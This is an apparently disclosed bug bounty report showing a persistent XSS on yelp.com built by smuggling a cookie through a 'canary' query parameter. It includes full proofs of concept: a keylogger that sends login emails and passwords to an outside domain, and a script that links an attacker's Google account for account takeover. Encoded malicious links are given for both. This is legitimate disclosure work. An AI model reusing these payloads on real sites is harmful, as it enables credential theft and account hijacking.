# yelp.com XSS ATO (via login keylogger, link Google account)

## Report Details
- **Report ID**: 2010530
- **URL**: https://hackerone.com/reports/2010530
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-06-02T14:40:46.930Z
- **Disclosed**: 2023-08-15T11:59:03.777Z

## Reporter
- **Username**: lil_endian
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: yelp

## Vulnerability Information
# Summary:
yelp.com reflects the content of the cookie `guvo` in the html returned to the user. In some cases this value is not properly escaped, leading to XSS. This can be combined with another issue where the backend does not properly parse the user supplied cookies and allows us to smuggle a `guvo` cookie inside a cookie named `yelpmainpaastacanary`. The `yelpmainpaastacanary` cookie can be set by including a URL query parameter `?canary=[Cookie value]`  in any request to `*.yelp.com`.

This report shows how chaining this cookie XSS with a cookie parsing issue leads to persistent XSS in a victims browser. To demonstrate impact I'll show how this can be used to inject a keylogger on `https://biz.yelp.com/login` to steal email/password of a business account, as well as how it's possible to link an attackers Google account to a victims Yelp account, and gain access to the victims account via "Sign in with Google".

# Description
## XSS via "guvo" cookie
The value of the cookie `guvo` is reflected (unescaped) on some pages. Most interestingly on the frontpage of `www.yelp.com` and on the login page of `https://biz.yelp.com/login`. The unescaped reflection happens in the `window.ySitRepParams` object and the `window.yelp.guv` property. This can be seen by simply adding the cookie to the request in a browser or Burp, and observe the response:
██████████
█████████

## Setting the "yelpmainpaastacanary" cookie
There is a feature on `yelp.com` where by adding the query parameter `?canary=asdf` to a request, the response will contain an HTTP header:
```
Set-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```
This gives us a way to set the cookie `yelpmainpaastacanary` to any value we want. But we need a way to control the `guvo` cookie. It turns out that we can smuggle the `guvo` cookie inside the `yelpmainpaastacanary` cookie.

## Broken cookie parsing and cookie smuggeling
The Yelp backend will parse the users cookies by splitting them by spaces instead of semicolons. Normally cookies sent by the browser will be separated by semicolons like
```
Cookie: a=1; b=2;
```
which should be parsed as 2 cookies `a` and `b`. But if we set a cookie like:
```
Cookie: a=1 b=2;
```
This should be parsed as 1 cookie `a` with the value "`1 b=2`", but Yelp will parse it as 2 cookies `a` and `b`. We can abuse this to smuggle the `guvo` cookie inside the `yelpmainpaastacanary` cookie by making a request to 
```
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
████

which sets the cookie
```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure; 
```
and results in our XSS payload triggering every time we visit the front page of `www.yelp.com`:
{F2394020}

As an added bonus we can also inject a `Max-Age: 99999999` attribute so our cookie doesn't expire and will just live in the victims browser and wait for our XSS injection to happen:
```
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999
```
```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```

# POCs
_Please note: Since I'm in Denmark yelp.com will redirect to yelp.dk. The attacks work exactly the same on both domains._

## Keylogger on biz.yelp.com/login
This javascript snippet will leak the content of the email and password fields on `https://biz.yelp.com/login` when the user types, or when the login form is submitted. The credentials are leaked to the domain `calc.sh` which I own:
```javascript
setTimeout(function () {
  a = document.getElementsByName('password')[0];
  b = document.getElementsByName('email')[0];
  function f() {
    fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
  }
  a.form.onclick=f;
  a.onchange=f;
  b.onchange=f;
  a.oninput=f;
  b.oninput=f;
}, 1000)
```

We create a link that will set the guvo cookie to fire this payload on the login page. See this CyberChef recipe for how it's done and to easily make modifications:
```
https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=c2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgYSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdwYXNzd29yZCcpWzBdOwogIGIgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnZW1haWwnKVswXTsKICBmdW5jdGlvbiBmKCkgewogICAgZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8/YT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKTsKICB9CiAgYS5mb3JtLm9uY2xpY2s9ZjsKICBhLm9uY2hhbmdlPWY7CiAgYi5vbmNoYW5nZT1mOwogIGEub25pbnB1dD1mOwogIGIub25pbnB1dD1mOwp9LCAxMDAwKQ
```
Our final link looks like this:
```
https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```

Anyone visiting that link will have our keylogger installed. Here's a short video showing it in action:
███

## Account takeover by linking a Google account
The request to link a Google account to a Yelp account is done from `https://yelp.com/profile_sharing`. The final request in the Google-link-flow is a POST request to `https://www.yelp.dk/google_connect/register` with CSRF token `csrftok` and a token `id_token` which is the token liking a Google account to the Yelp account. We can generate a token for our own Google account, and then use the XSS to link it to a victims account.

To generate a token we simply link a Google account to our own Yelp account and intercept the final request in Burp:
████████

Now that we have a token for the Google accoutn `██████` we can create an XSS payload for a victim. In this code we make a request to `/profile_sharing` and extract the csrf token with a reqular expression. We then make the request to link our Google account to the victims account using the `id_token` we prepared:
```javascript
(function f() {
  a = new XMLHttpRequest();
  a.addEventListener('load', function () {
    rx = /"GoogleConnect": "([^"]*)/;
    id_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg";
    b = rx.exec(this.responseText);
    fetch("https://www.yelp.dk/google_connect/register", {"method": "POST", "body": new URLSearchParams({"id_token": id_token, "csrftok": b[1]})})
  });
  a.open('GET', 'https://www.yelp.dk/profile_sharing');
  a.send();
})();
```

Again, we use this cyberchef recipe to create a link that infects the victim:
```
https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=KGZ1bmN0aW9uIGYoKSB7CiAgYSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogIGEuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uICgpIHsKICAgIHJ4ID0gLyJHb29nbGVDb25uZWN0IjogIihbXiJdKikvOwogICAgaWRfdG9rZW4gPSAiZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqWXdPRE5rWkRVNU9ERTJOek5tTmpZeFptUmxPV1JoWlRZME5tSTJaakF6T0RCaE1ERTBOV01pTENKMGVYQWlPaUpLVjFRaWZRLmV5SnBjM01pT2lKb2RIUndjem92TDJGalkyOTFiblJ6TG1kdmIyZHNaUzVqYjIwaUxDSnVZbVlpT2pFMk9EVTNNVEF4TmpFc0ltRjFaQ0k2SWpZNU9UWTVNVGc1TlRjeE1TMTJiVEpyT0dWbllqTXlOMmh4TTJ3d1lUZGpjbk5xTUc4eWJ6bHNaVzQyTVM1aGNIQnpMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlNJc0luTjFZaUk2SWpFd05EQTBNVEExTXpreU1qUTVORFkzTWpFeE55SXNJbVZ0WVdsc0lqb2laRzl2WkdGa2RXZDFZMEJuYldGcGJDNWpiMjBpTENKbGJXRnBiRjkyWlhKcFptbGxaQ0k2ZEhKMVpTd2lZWHB3SWpvaU5qazVOamt4T0RrMU56RXhMWFp0TW1zNFpXZGlNekkzYUhFemJEQmhOMk55YzJvd2J6SnZPV3hsYmpZeExtRndjSE11WjI5dloyeGxkWE5sY21OdmJuUmxiblF1WTI5dElpd2libUZ0WlNJNklrUmhaR1VnVFhWeWNHaDVJaXdpY0dsamRIVnlaU0k2SW1oMGRIQnpPaTh2YkdnekxtZHZiMmRzWlhWelpYSmpiMjUwWlc1MExtTnZiUzloTDBGQlkwaFVkR1pHVmxSRlNVNWZjM1ZWVjAxQ1RtcGpTR0ZFV0hnM1RESmxiSEZRTVRWd05HaExha3N4UFhNNU5pMWpJaXdpWjJsMlpXNWZibUZ0WlNJNklrUmhaR1VpTENKbVlXMXBiSGxmYm1GdFpTSTZJazExY25Cb2VTSXNJbWxoZENJNk1UWTROVGN4TURRMk1Td2laWGh3SWpveE5qZzFOekUwTURZeExDSnFkR2tpT2lKbU56WXlaRFpsWmpFeVptRmtOakk1WW1FNFlUWTVPR0ZoTUROaE1HTTNOelU0TXpZd1lXVXhJbjAuSy1YY2FBQlZoVXYtV21jcEhMQ0VhRGs1cmVZV0gwN0FiMVFrVXhoYUdiTlFZenQxNFZpUG0yeWJpSWdKVUtoeXV3Snp6QWpsbEp2dHJWMl9OclVablEwdkFfdjdQdUtPOUdRVmg3Mm5ZeDVzV242TGpNc3VXTGg1ZDI0VmstUnkxQ3FDX3hzMmpFZWgwM2Vtc1otMUdoYV8tQUJ3bGJDREg1eXFlZXBOa2gyRWFZWjdjS1ZzVVV4bklqcFhLck83eFM3elA3YUJ5dDBtSEExZ1VTZWktNGFhbF9QVks0eklHYTJHeXZMQ1RRM2Zxc2VEejdGQ3JRWU8tM0gtVks5TzJOaUJZWmN6YnpfdkxvUlF0QVNlUmdiajVqUVV0RURqZnpLOE1UVmd2V1BWajNFWnZ0NEJiZDBjcF9vRm1wTDFXak15QjltVHRPS0JTTTNEYVdkTE5nIjsKICAgIGIgPSByeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KTsKICAgIGZldGNoKCJodHRwczovL3d3dy55ZWxwLmRrL2dvb2dsZV9jb25uZWN0L3JlZ2lzdGVyIiwgeyJtZXRob2QiOiAiUE9TVCIsICJib2R5IjogbmV3IFVSTFNlYXJjaFBhcmFtcyh7ImlkX3Rva2VuIjogaWRfdG9rZW4sICJjc3JmdG9rIjogYlsxXX0pfSkKICB9KTsKICBhLm9wZW4oJ0dFVCcsICdodHRwczovL3d3dy55ZWxwLmRrL3Byb2ZpbGVfc2hhcmluZycpOwogIGEuc2VuZCgpOwp9KSgpOw
```

And the final link looks like this:
```
https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFteIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```

This video shows the attack. On the left is the victim and on the right is the attacker. The victim is logged into their yelp account. He then signs out and at some point visits our malicious link. When the victim sometime later signs into his Yelp account our payload triggers and our Google account `████` is linked to the victim. The attacker can now sign in with Google and gets signed into the victims account.
██████████

## Impact

This attack can be used to completely compromise business accounts, and do account takeovers on normal accounts on yelp.com. Since the cookie does not expire, all it takes is for the victim to at some point vist our link, and they'll be compromised when they later go to sign in to yelp.com. The link can be spread via the Yelp forum, reviews or private messages to other uses, making it easy to target other Yelp users.

## Attachments
- 2023-06-01-160522_987x540_scrot.png
